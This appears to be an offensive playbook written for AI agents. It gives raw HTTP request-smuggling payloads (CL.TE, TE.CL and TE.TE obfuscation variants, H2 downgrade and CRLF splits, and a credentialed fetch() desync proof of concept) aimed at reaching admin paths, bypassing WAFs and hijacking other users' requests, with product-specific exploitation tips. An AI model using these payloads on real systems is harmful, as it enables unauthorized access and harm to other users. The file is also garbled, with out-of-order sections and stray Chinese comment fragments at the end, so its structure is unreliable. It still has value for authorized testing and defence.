# SKILL: HTTP Request Smuggling — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert HTTP desync techniques. Covers CL.TE, TE.CL, TE.TE obfuscation variants, HTTP/2 downgrade and pseudo-header confusion, client-side desync (browser `fetch` pipelines), and tool-assisted fuzzing. Assumes familiarity with raw HTTP/1.1 framing and reverse-proxy topologies. This is not “header injection” — it is **message boundary disagreement** between hops.

Routing note: load this skill when you suspect CDN/reverse-proxy and origin disagree on request-end boundaries, or when abnormal concatenation appears during H2-to-H1 downgrade.

## 0. RELATED ROUTING

- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) when the HTTP client library is **Apache HttpClient <= 4.5.9** (HTTPCLIENT-1974/1978) — injecting `瘍瘊` (U+760D U+760A, low bytes `\r\n`) into a header value causes the underlying char-to-byte writer to emit a literal CRLF, splitting the request at the origin without relying on CL/TE disagreement

## 1. QUICK START

### CL.TE first probe (front-end trusts CL, back-end trusts chunked)

Assumption: front end prioritizes `Content-Length`, back end prioritizes `Transfer-Encoding: chunked`. Use a very short CL so the front end accepts a fake end, while the back end continues chunk parsing and leaves remaining bytes for the next request.

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

- Front end reads only 13 bytes based on `Content-Length: 13` (that is, `0\r\n\r\nSMUGGLED`, 13 bytes total) and considers the request complete.
- Back end parses as chunked: after the `0` end chunk, it treats **`SMUGGLED` and onward** as the start byte stream of the **next request**.

### TE.CL first probe (front-end trusts chunked, back-end trusts CL)

Assumption: front end parses chunked and back end only reads `Content-Length`. Set **CL equal to the number of bytes in the chunk-length line** (commonly `4`: two hex characters + `\r\n`), so the back end consumes only the length line and leaves the rest buffered for follow-up request splicing.

Embed a second request in the chunk (all line endings are **CRLF**; `35` hex chunk length = 53 bytes):

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target.example
Foo: x

0

```

On the wire, the chunk body must be exactly 53 bytes; if you change path/headers, recalculate chunk length and update the hex length line accordingly.

### Safety note

Test only within **authorized scope**; concurrent smuggling can poison connection pools, corrupt caches, or impact other tenants. Prefer isolated environments or low-traffic windows.

---

## 1. CORE CONCEPT

**Definition**: two (or more) HTTP processing entities disagree on where request one ends and request two begins in the **same TCP/TLS stream**, allowing an attacker to include a **partial or full** second request inside one logical request.

```
  Client          Front (proxy/WAF)              Back (origin)
     |                     |                            |
     |==== Request A+B ===>|                            |
     |                     | parses boundary #1         | parses boundary #2
     |                     |         \                  |         /
     |                     |          different split points
     |                     |                            |
     v                     v                            v
                   Request A (seen)              Request A' + smuggled B
```

**Difference from CRLF injection**: CRLF usually injects into **responses** or **header lines**; smuggling targets implementation differences in **RFC 7230 message framing** (`Content-Length` / `chunked`).

**High-value impact**: WAF rule bypass (smuggled body not visible in front-end request), hijacking other users' requests on shared-origin connections (queue poisoning), cache-poisoning assistance, and authentication-boundary confusion.

---

## 2. CL.TE VULNERABILITIES

**Pattern**: front end trusts **`Content-Length`**; back end trusts **`Transfer-Encoding: chunked`**.

**Exact example** (same as §0): `Content-Length: 13` and `Transfer-Encoding: chunked` both exist, body is:

```text
0\r\n\r\nSMUGGLED
```

Byte count: `0` + `\r\n` + `\r\n` + `SMUGGLED` = 13.

**Back-end perspective**: the chunked stream ends at `0\r\n\r\n`; if `SMUGGLED` starts with `METHOD SP` or another valid request prefix, it becomes a **smuggled request-line prefix**.

**Tuning**: if the target is sensitive to duplicate headers, casing, or spaces, minimally adjust `Transfer-Encoding` variants (see §4) while preserving semantics to match a combo where front end ignores TE and back end executes TE.

---

## 3. TE.CL VULNERABILITIES

**Pattern**: front end parses **chunked**; back end only reads **`Content-Length`** (or too-short CL).

**Intent**: front end treats the whole malicious byte stream as body; back end reads only CL length, leaving remaining bytes buffered to splice with later legitimate requests.

**Full TE.CL with embedded second request** (same family as §0; `Content-Length: 4` + first chunk-length line `35\r\n`):

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target.example
Foo: x

0

```

Explanation:

- **Back end (CL)**: reads only 4 bytes from the message body start -> `3` `5` `\r` `\n`, marks body complete, and leaves the remaining bytes in the TCP read buffer.
- **Front end (TE)**: parses full stream as chunked and forwards/consumes `GET /admin...` as body content of the **already-closed first request** (product-dependent); mismatch with back-end boundary interpretation forms TE.CL.

For longer smuggling (e.g., `POST` + `Content-Length: 11` + `x=1`), chunk length is about `76` (hex `0x76` = 118 bytes); `Content-Length: 4` can still pin the back end to reading only the length line.

**Practical notes**: chunk length must be valid hex; second request must meet target expectations for Host, path, and session cookie; timing window and connection-reuse strategy determine whether you hit another user's request.

---

## 4. TE.TE VULNERABILITIES

**Pattern**: both front and back claim to process `Transfer-Encoding`, but differ on which TE value is effective or valid -> still producing equivalent desync where one side sees chunked and the other does not.

Use the following **8 obfuscation variants** to probe parser differentials (single-line display; `\t` means a real TAB):

```http
Transfer-Encoding: xchunked
```

```http
Transfer-Encoding : chunked
```

```http
Transfer-Encoding: chunked
Transfer-Encoding: chunked
```

```http
Transfer-Encoding: x
```

```http
Transfer-Encoding:[TAB]chunked
```
(Replace `[TAB]` with real `\x09`.)

```http
 Transfer-Encoding: chunked
```
(One leading space at line start.)

```http
X: X
Transfer-Encoding: chunked
```
(Previous line value is `X` and next line starts with `Transfer-Encoding`: this uses **line continuation / lenient header parsing** so one hop may merge or split lines incorrectly; separator between `X` and `Transfer-Encoding` may be `\n` or `\r\n` depending on the target stack.)

```http
Transfer-Encoding
: chunked
```
(Field name and colon are on **different physical lines**; some parsers still treat it as valid `Transfer-Encoding: chunked`.)

**Strategy**: for each (front, back) pair, enumerate which side accepts each variant as `chunked`, then map to equivalent CL.TE or TE.CL using §2/§3.

---

## 5. HTTP/2 REQUEST SMUGGLING

### H2 -> H1 Downgrade

Common scenario: edge supports HTTP/2 and origin uses HTTP/1.1. If implementation does not strictly normalize header fields and body boundaries, you may observe:

- incorrect pseudo-header to regular-header mapping order;
- forbidden headers (such as some `Connection` combinations) forwarded incorrectly;
- duplicate-header merge rules inconsistent with the origin.

### Pseudo-header / header-injection smuggling (concept payload)

Attack surface comes from downstream H1 parsers treating certain bytes as the **start of a new request**. A common research/CTF approach is to place near-request bytes inside header values that one layer ignores but another treats literally:

```text
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: target
```

**Meaning**: if one hop keeps the full string in a header value and the next hop mis-splits during H1 reconstruction, parsing may start a new `GET / HTTP/1.1` at `\r\n\r\n`.

**Testing directions**:

- duplicate and case handling for `Transfer-Encoding` / `Content-Length` in H2 (H2 requires lowercase, but translation layers can fail);
- downgrade behavior when `:method` or `:path` includes abnormal characters;
- interactions between tunneling or extended CONNECT and smuggling.

---

## 6. CLIENT-SIDE DESYNC

**Scenario**: browser request-body handling differs from middleware/origin, or **`no-cors` + preflight exemptions** permit atypical messages that create queue effects similar to classic CL.TE/TE.CL (architecture-dependent).

**HEAD + GET chain**: some stacks historically mishandle HEAD response bodies, later pipelining, or connection reuse; validate with concrete browser versions and target proxy behavior.

**JavaScript PoC shape** (illustrative: set body to raw bytes containing `GET`, with `no-cors` and credentials):

```javascript
fetch("https://target.example/vulnerable", {
  method: "POST",
  mode: "no-cors",
  credentials: "include",
  body: "GET /admin HTTP/1.1\r\nHost: target.example\r\n\r\n"
});
```

**Note**: browser security model limits direct readability; success often appears as side effects on other requests over the same connection or as abnormal server logs/behavior, not direct response reading. Evaluate with SOP, CORS, and extension/proxy factors.

## 9. 2026 EMERGING TECHNIQUES

The desync landscape in 2026 has shifted almost entirely to HTTP/2→HTTP/1.1 downgrade translation flaws. Classic CL.TE/TE.CL on pure HTTP/1.1 front-to-back paths are largely dead due to RFC 9112 enforcement; the viable surface is now binary-frame ↔ text-protocol boundary disagreement.

### 9.1 H2.CL Desync (2026 primary battleground)

The attacker declares `content-length: 0` in the HTTP/2 headers but the H2 DATA frame length covers a full smuggled body. The front end (HTTP/2-aware) trusts the frame length and forwards the complete body; during downgrade it emits the literal `Content-Length: 0` header to the HTTP/1.1 back end. The back end reads 0 bytes, marks the request complete, and treats the trailing body bytes as the start of the next pipelined request.

```text
H2 request (front end sees):
  :method: POST
  :path: /
  content-length: 0      <- header forwarded verbatim on downgrade
  <DATA frame, length=N>  <- front end forwards N body bytes

Downgraded H1 (back end sees):
  POST / HTTP/1.1
  Content-Length: 0

  GET /admin HTTP/1.1     <- smuggled: back end read 0 bytes, this is "next request"
  Host: target.example
  ...
```

### 9.2 H2.TE Desync

HTTP/2 technically forbids `transfer-encoding`, but some front ends still forward it during downgrade. The front end ignores TE (it uses frame length for body boundaries); the HTTP/1.1 back end honors `Transfer-Encoding: chunked`. A terminating `0\r\n\r\n` ends the chunked body and the bytes after it become a smuggled second request.

### 9.3 H2 CRLF Header Injection

HTTP/2 headers are binary and may legally contain bytes that are illegal in HTTP/1.1 header values, including `\r\n`. On downgrade these bytes become real line breaks → full request splitting. **Fastly edge, observed May 2026**: when the `:method` pseudo-header contained CRLF characters under specific path-rewrite configurations, the downgrade stage concatenated the CRLF directly into the downstream HTTP/1.1 request line, allowing a complete second request to be smuggled.

### 9.4 TE.TE Obfuscation (still exploitable in 2026)

**Envoy 1.32 + Gunicorn 22.0**: a `Transfer-Encoding` header prefixed with a vertical-tab character (`\x0b`) is treated by Envoy as non-compliant-but-recoverable and dropped, while Gunicorn falls back to `Content-Length` → classic CL.TE-equivalent desync. TE.TE remains the only traditional variant that still produces desync after RFC 9112 hardening.

```http
POST / HTTP/1.1
Host: target.example
Content-Length: 89
Transfer-Encoding:\x0bchunked

0

GET /admin HTTP/1.1
Host: target.example
...
```

### 9.5 CL.0 Variant

Declare `Content-Length: 0` but send a body anyway. **Nginx 1.27 + Waitress 3.0** in keep-alive mode: the back end reads 0 bytes per the CL header, then treats the trailing bytes as the next pipelining request on the reused connection.

### 9.6 MadeYouReset — CVE-2025-8671 (disclosed Aug 2025)

Distinct from Rapid Reset (CVE-2023-44487): Rapid Reset abuses **client-sent** RST_STREAM; MadeYouReset abuses **server-sent** stream resets. The attacker deliberately sends frames that trigger a protocol violation, inducing the server to reset the stream — which still consumes resources on open+reset. Affects unpatched HTTP/2 implementations with limited mitigation; the Rust **h2 crate < 0.4.11** is vulnerable. Cloudflare was already immune due to its 2023 Rapid Reset mitigations.

### 9.7 HTTP/3 (QUIC) Smuggling Surface (emerging)

- **0-RTT replay**: early data is replayable; smuggled requests in 0-RTT can be retransmitted to a different edge.
- **Connection migration**: QUIC connection IDs let a client migrate across IPs, bypassing IP-based access control between edge and origin.
- **WAF blind spot**: WAFs that only inspect TCP traffic miss QUIC/UDP entirely — a smuggled request over HTTP/3 may never be inspected.

### 9.8 Traditional CL.TE / TE.CL Status (2026)

RFC 9112 §6.1 mandates rejecting requests that carry both `Content-Length` and `Transfer-Encoding`. A 2026 re-test of six front-end proxies returned a direct **400** for five of them when both headers were present. **TE.TE is the only traditional variant that still produces desync**; pure CL.TE/TE.CL on modern stacks is effectively closed.

| Variant | 2026 viability | Notes |
|---|---|---|
| CL.TE (H1↔H1) | Mostly closed | 5/6 proxies reject dual CL+TE |
| TE.CL (H1↔H1) | Mostly closed | Same RFC 9112 enforcement |
| TE.TE (H1↔H1) | Viable | Obfuscation bytes still create parser differentials |
| H2.CL / H2.TE | Primary surface | Downgrade translation is the 2026 battleground |
| H2 CRLF injection | Viable | Binary header values split H1 on downgrade |

- **Input enters interpreter/query language/template** (not HTTP framing) -> [Injection Testing Router](../injection-checking/SKILL.md) (then drill down into XSS, SQLi, SSTI, etc.).
- **Response header splitting / Location CRLF** -> [CRLF Injection](../crlf-injection/SKILL.md).
- **Cache and path-key confusion** -> [Web Cache Deception](../web-cache-deception/SKILL.md).

Once confirmed as an **HTTP message-boundary** issue rather than parameter injection, **stay in this skill** to avoid misrouting into general injection workflows.

# 攻击面: 前端支持 HTTP/3 (QUIC) → 后端 HTTP/1.1
# 降级过程中的关键差异:
# 1. QUIC 的流是无序的，HTTP/1.1 的请求必须有序
# 2. QUIC 的头部压缩 (QPACK) 与 HTTP/1.1 的 HPACK 不同
# 3. QUIC 的 0-RTT 数据可被重放

# 探测目标是否支持 HTTP/3

# CVE-2026-2835: QUIC 连接迁移滥用
# QUIC 允许客户端在 IP 地址变化时迁移连接
# 攻击者利用连接迁移绕过 IP 级别的访问控制

# 攻击链:
# 1. 从合法 IP 建立 QUIC 连接
# 2. 在连接中发送走私请求
# 3. 迁移到攻击者 IP
# 4. 后端以原始 IP 的身份处理走私请求

# CVE-2026-2836: 0-RTT 重放走私
# QUIC 0-RTT 数据可被重放到不同的连接
